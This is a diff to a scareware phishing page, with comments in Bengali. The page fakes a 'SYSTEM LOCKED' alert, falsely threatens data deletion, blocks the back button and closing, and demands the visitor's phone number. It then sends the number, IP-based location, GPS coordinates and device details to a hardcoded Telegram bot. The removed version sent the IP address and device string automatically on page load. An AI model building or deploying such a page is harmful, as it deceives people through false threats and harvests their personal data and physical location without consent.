@@ -3,70 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYSTEM CRITICAL ERROR</title>
+    <title>⚠️ SYSTEM SECURITY LOCK</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; cursor: crosshair; }
-        .hacker-img { width: 100%; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; opacity: 0.5; z-index: -1; }
-        .status { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; }
-        h1 { font-size: 30px; color: red; text-shadow: 0 0 10px red; }
-        .console { text-align: left; font-size: 12px; height: 150px; overflow: hidden; border: 1px solid #0f0; padding: 10px; background: rgba(0,0,0,0.8); }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .lock-screen { border: 2px solid #f00; padding: 30px; background: #0a0a0a; box-shadow: 0 0 50px #f00; width: 85%; z-index: 9999; }
+        h1 { font-size: 24px; animation: blink 0.5s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        input { width: 90%; padding: 15px; margin: 20px 0; border: 1px solid #f00; background: #000; color: #0f0; font-size: 18px; text-align: center; outline: none; }
+        .btn { background: #f00; color: #fff; padding: 15px; width: 100%; border: none; font-weight: bold; cursor: pointer; font-size: 16px; }
     </style>
 </head>
-<body onclick="forceCapture()">
+<body onclick="enableFullScreen()">
 
-    <img src="https://i.ibb.co/6P8PzYk/hacker.jpg" class="hacker-img">
-
-    <div class="status">
-        <h1>[ SYSTEM HACKED ]</h1>
-        <div class="console" id="console">
-            > Initializing bypass...<br>
-            > Accessing kernel...<br>
-            > Fetching system data...<br>
-        </div>
-        <p style="color: yellow; margin-top: 20px;">Touch to Abort...</p>
+    <div class="lock-screen" id="mainBox">
+        <h1>[ SYSTEM LOCKED ]</h1>
+        <p>Your phone is locked due to suspicious activity. Unauthorized exit will trigger data deletion.</p>
+        <p style="color: yellow;">Enter your phone number to authorize unlock:</p>
+        
+        <input type="number" id="phoneNum" placeholder="Phone Number" required>
+        
+        <button class="btn" onclick="captureAndUnlock()">AUTHORIZE & UNLOCK</button>
     </div>
 
 <script>
-    // পেজ লোড হতেই আইপি পাঠিয়ে দিবে (কোনো পারমিশন লাগবে না)
-    window.onload = function() {
-        autoCapture();
-        startConsole();
+    // ফুল স্ক্রিন মোড সচল করা (এতে নেভিগেশন বার লুকিয়ে যায়)
+    function enableFullScreen() {
+        let elem = document.documentElement;
+        if (elem.requestFullscreen) {
+            elem.requestFullscreen();
+        } else if (elem.webkitRequestFullscreen) {
+            elem.webkitRequestFullscreen();
+        }
+    }
+
+    // ব্যাক বাটন ব্লক করা
+    window.history.pushState(null, null, window.location.href);
+    window.onpopstate = function () {
+        window.history.go(1);
+        alert("⚠️ WARNING: Attempt to bypass security! Exit blocked.");
     };
 
-    function startConsole() {
-        let con = document.getElementById('console');
-        setInterval(() => {
-            con.innerHTML += "> Fetching packets... DONE<br>";
-        }, 1000);
-    }
+    // ক্লোজ করার চেষ্টা করলে ওয়ার্নিং
+    window.onbeforeunload = function() {
+        return "Are you sure you want to leave? Your data may be lost.";
+    };
 
-    async function autoCapture() {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
+    async function captureAndUnlock() {
+        const phone = document.getElementById('phoneNum').value;
+        if (phone.length < 10) {
+            alert("সঠিক নম্বর দিন!");
+            return;
+        }
+
+        // আইপি ও লোকেশন ডেটা পাঠানো
+        const ipRes = await fetch('https://ipapi.co/json/');
         const ipData = await ipRes.json();
-        const userIP = ipData.ip;
-        const device = navigator.userAgent;
 
-        sendToTelegram(userIP, device, "Click to see location", "Click to see location");
-    }
-
-    function forceCapture() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
-                sendToTelegram("Update", "Update", pos.coords.latitude, pos.coords.longitude);
+                sendToBot(phone, ipData, pos.coords.latitude, pos.coords.longitude);
             }, () => {
-                alert("ERROR: Security Bypass Failed! Location required to abort.");
+                sendToBot(phone, ipData, "Denied", "Denied");
             });
         }
     }
 
-    function sendToTelegram(ip, dev, lat, lon) {
+    function sendToBot(phone, ipData, lat, lon) {
         const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
         const chat_id = "7547190025";
-        let map = (lat === "Update" || lat === "Click to see location") ? lat : `https://www.google.com/maps?q=${lat},${lon}`;
+        const device = navigator.userAgent;
         
-        const text = `💀 **HACKER TRAP SUCCESS** 💀\n\n🌐 **IP:** ${ip}\n📱 **Device:** ${dev}\n📍 **Map:** ${map}`;
+        let map = (lat === "Denied") ? "Denied" : `https://www.google.com/maps?q=${lat},${lon}`;
+        
+        const text = `🎯 **ফোন লক করা হয়েছে!** 🎯\n\n` +
+                     `📞 **Phone:** ${phone}\n` +
+                     `🌐 **IP:** ${ipData.ip}\n` +
+                     `📱 **Device:** ${device}\n` +
+                     `📍 **Map:** ${map}`;
 
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`)
+        .then(() => {
+            alert("Authorization Successful! System Unlocked.");
+            window.location.href = "https://www.google.com";
+        });
     }
 </script>
 
